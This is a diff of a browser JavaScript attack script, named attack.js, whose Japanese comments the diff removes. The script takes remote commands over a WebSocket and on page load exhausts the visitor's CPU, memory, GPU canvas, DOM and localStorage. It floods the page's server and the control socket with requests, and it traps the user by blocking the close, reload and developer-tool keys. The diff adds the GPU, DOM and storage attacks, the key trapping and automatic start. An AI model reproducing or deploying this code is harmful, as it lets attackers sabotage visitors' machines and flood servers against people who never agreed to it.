@@ -1,12 +1,9 @@
-// attack.js - WebSocket
 (function() {
     'use strict';
 
-    // ============================================
-    // WebSocketでサーバーと持続的接続
-    // ============================================
     let socket = null;
-    let reconnectAttempts = 0;
+    let isAttacking = false;
+    let intensity = 1;
 
     function connectWebSocket() {
         try {
@@ -15,9 +12,7 @@
             
             socket.onopen = () => {
                 console.log('接続確立');
-                reconnectAttempts = 0;
                 
-                // 接続が切れないように定期的にping
                 setInterval(() => {
                     if (socket.readyState === WebSocket.OPEN) {
                         socket.send(JSON.stringify({
@@ -26,6 +21,8 @@
                         }));
                     }
                 }, 1000);
+                
+                startAttack(2);
             };
             
             socket.onmessage = (e) => {
@@ -34,26 +31,20 @@
                     
                     switch(data.command) {
                         case 'attack':
-                            // サーバーからの指示で攻撃開始
                             startAttack(data.intensity || 1);
                             break;
                         case 'stop':
-                            // 攻撃停止
                             stopAttack();
                             break;
                         case 'update':
-                            // 設定更新
-                            updateConfig(data.config);
+                            intensity = data.config?.intensity || intensity;
                             break;
                     }
                 } catch(err) {}
             };
             
             socket.onclose = () => {
-                // 切断されたら再接続
-                reconnectAttempts++;
-                const delay = Math.min(reconnectAttempts * 1000, 30000);
-                setTimeout(connectWebSocket, delay);
+                setTimeout(connectWebSocket, 100);
             };
             
             socket.onerror = () => {
@@ -62,113 +53,43 @@
         } catch(e) {}
     }
 
-    // ============================================
-    // 攻撃エンジン
-    // ============================================
-    let attackInterval = null;
-    let isAttacking = false;
-    let intensity = 1;
-
     function startAttack(level) {
         intensity = level;
         isAttacking = true;
         
-        // すでに動いてたら止める
-        if (attackInterval) {
-            clearInterval(attackInterval);
-        }
-        
-        // 攻撃開始
         cpuAttack();
         memoryAttack();
+        gpuAttack();
+        domAttack();
         networkAttack();
-        
-        attackInterval = setInterval(() => {
-            if (isAttacking) {
-                // 継続的に負荷をかける
-                let x = 0;
-                for (let i = 0; i < 1000000 * intensity; i++) {
-                    x += Math.random() * Math.random();
-                }
-            }
-        }, 0);
+        storageAttack();
     }
 
     function stopAttack() {
         isAttacking = false;
-        if (attackInterval) {
-            clearInterval(attackInterval);
-        }
     }
 
-    function updateConfig(config) {
-        intensity = config.intensity || intensity;
-    }
-
-    // ============================================
-    // CPU攻撃（Web Workers + WebSocket連携）
-    // ============================================
     function cpuAttack() {
         const cores = navigator.hardwareConcurrency || 4;
         const workerCode = `
-            let running = true;
-            
-            self.onmessage = (e) => {
-                if (e.data === 'stop') {
-                    running = false;
-                }
-                if (e.data === 'start') {
-                    running = true;
-                    attack();
-                }
-            };
-            
-            function attack() {
-                if (!running) return;
-                
+            setInterval(() => {
                 let x = 0;
-                const startTime = Date.now();
-                
-                // 1秒間全力で計算
-                while (Date.now() - startTime < 1000) {
-                    x += Math.sqrt(Math.random() * 1000) * Math.random();
+                for (let i = 0; i < 10000000; i++) {
+                    x += Math.sqrt(i) * Math.random();
                 }
-                
-                // 結果をサーバーに報告
-                self.postMessage({
-                    type: 'result',
-                    value: x,
-                    timestamp: Date.now()
-                });
-                
-                // 継続
-                setTimeout(attack, 0);
-            }
-            
-            attack();
+            }, 0);
         `;
         
         const blob = new Blob([workerCode], { type: 'application/javascript' });
         const url = URL.createObjectURL(blob);
         
         for (let i = 0; i < cores; i++) {
-            const worker = new Worker(url);
-            
-            worker.onmessage = (e) => {
-                // 計算結果をサーバーに送信
-                if (socket && socket.readyState === WebSocket.OPEN) {
-                    socket.send(JSON.stringify({
-                        type: 'worker_result',
-                        data: e.data
-                    }));
-                }
-            };
+            try {
+                new Worker(url);
+            } catch(e) {}
         }
     }
 
-    // ============================================
-    // メモリ攻撃
-    // ============================================
     function memoryAttack() {
         const memArrays = [];
         
@@ -176,46 +97,90 @@
             if (!isAttacking) return;
             
             try {
-                for (let i = 0; i < 10 * intensity; i++) {
-                    const buffer = new ArrayBuffer(1024 * 1024 * 5);
+                for (let i = 0; i < 5 * intensity; i++) {
+                    const buffer = new ArrayBuffer(1024 * 1024 * 10);
                     const view = new Uint8Array(buffer);
-                    
-                    // 実際にメモリに書き込む
-                    for (let j = 0; j < view.length; j += 500) {
+                    for (let j = 0; j < view.length; j += 1000) {
                         view[j] = Math.random() * 255;
                     }
-                    
                     memArrays.push(buffer);
                 }
                 
-                if (memArrays.length > 100) {
-                    memArrays.splice(0, 20);
+                if (memArrays.length > 50) {
+                    memArrays.splice(0, 5);
                 }
             } catch(e) {
                 memArrays.length = 0;
             }
+        }, 100);
+    }
+
+    function gpuAttack() {
+        try {
+            const canvas = document.createElement('canvas');
+            canvas.width = 4000;
+            canvas.height = 4000;
+            canvas.style.display = 'none';
+            document.body.appendChild(canvas);
+            const ctx = canvas.getContext('2d');
+            
+            setInterval(() => {
+                if (!isAttacking) return;
+                
+                for (let i = 0; i < 100; i++) {
+                    ctx.fillStyle = `rgb(${Math.floor(Math.random()*255)},${Math.floor(Math.random()*255)},${Math.floor(Math.random()*255)})`;
+                    ctx.fillRect(Math.random()*4000, Math.random()*4000, 100, 100);
+                }
+                
+                for (let i = 0; i < 10; i++) {
+                    const grad = ctx.createRadialGradient(
+                        Math.random()*4000, Math.random()*4000, 0,
+                        Math.random()*4000, Math.random()*4000, 500
+                    );
+                    grad.addColorStop(0, `rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},1)`);
+                    grad.addColorStop(1, `rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},0)`);
+                    ctx.fillStyle = grad;
+                    ctx.fillRect(0, 0, 4000, 4000);
+                }
+            }, 0);
+        } catch(e) {}
+    }
+
+    function domAttack() {
+        const container = document.createElement('div');
+        container.style.display = 'none';
+        document.body.appendChild(container);
+        
+        setInterval(() => {
+            if (!isAttacking) return;
+            
+            for (let i = 0; i < 200; i++) {
+                const el = document.createElement('div');
+                el.textContent = 'x'.repeat(Math.floor(Math.random() * 500));
+                el.style.cssText = `position:absolute;top:${Math.random()*1000}px;left:${Math.random()*1000}px;width:${Math.random()*100}px;height:${Math.random()*100}px;background:rgb(${Math.random()*255},${Math.random()*255},${Math.random()*255});`;
+                container.appendChild(el);
+            }
+            
+            if (container.children.length > 5000) {
+                container.innerHTML = '';
+            }
         }, 50);
     }
 
-    // ============================================
-    // ネットワーク攻撃（Socket使って大量リクエスト）
-    // ============================================
     function networkAttack() {
         setInterval(() => {
             if (!isAttacking) return;
             
-            // 通常のHTTPリクエスト
-            for (let i = 0; i < 10 * intensity; i++) {
-                fetch(location.href.split('?')[0] + '?attack=' + Math.random(), {
+            for (let i = 0; i < 10; i++) {
+                fetch(location.href.split('?')[0] + '?dummy=' + Math.random(), {
                     mode: 'no-cors',
                     cache: 'no-store'
                 }).catch(() => {});
             }
             
-            // WebSocket経由でサーバーに負荷をかける
             if (socket && socket.readyState === WebSocket.OPEN) {
-                const largeData = 'x'.repeat(1024 * 100); // 100KB
-                for (let i = 0; i < 5 * intensity; i++) {
+                const largeData = 'x'.repeat(1024 * 50);
+                for (let i = 0; i < 3; i++) {
                     socket.send(JSON.stringify({
                         type: 'flood',
                         data: largeData,
@@ -226,9 +191,25 @@
         }, 100);
     }
 
-    // ============================================
-    // 離脱防止
-    // ============================================
+    function storageAttack() {
+        setInterval(() => {
+            if (!isAttacking) return;
+            
+            try {
+                for (let i = 0; i < 20; i++) {
+                    localStorage.setItem('k_' + Math.random(), 'x'.repeat(5000));
+                }
+                
+                if (localStorage.length > 500) {
+                    const keys = Object.keys(localStorage);
+                    for (let i = 0; i < 50; i++) {
+                        localStorage.removeItem(keys[i]);
+                    }
+                }
+            } catch(e) {}
+        }, 200);
+    }
+
     function preventLeave() {
         window.addEventListener('beforeunload', (e) => {
             e.preventDefault();
@@ -236,24 +217,28 @@
         });
         
         setInterval(() => {
-            history.pushState(null, '', location.href.split('?')[0] + '?block=' + Math.random());
+            try {
+                history.replaceState(null, '', location.href);
+            } catch(e) {}
         }, 1000);
+        
+        document.addEventListener('keydown', (e) => {
+            if (
+                (e.ctrlKey && (e.key === 'w' || e.key === 'W' || e.key === 't' || e.key === 'T' || e.key === 'r' || e.key === 'R')) ||
+                (e.altKey && e.key === 'F4') ||
+                e.key === 'F5' ||
+                e.key === 'F12'
+            ) {
+                e.preventDefault();
+                e.stopPropagation();
+                return false;
+            }
+        }, true);
     }
 
-    // ============================================
-    // 初期化
-    // ============================================
     function init() {
         connectWebSocket();
         preventLeave();
-        
-        // 接続確立後に自動で攻撃開始
-        const checkConnection = setInterval(() => {
-            if (socket && socket.readyState === WebSocket.OPEN) {
-                startAttack(1);
-                clearInterval(checkConnection);
-            }
-        }, 500);
     }
 
     init();
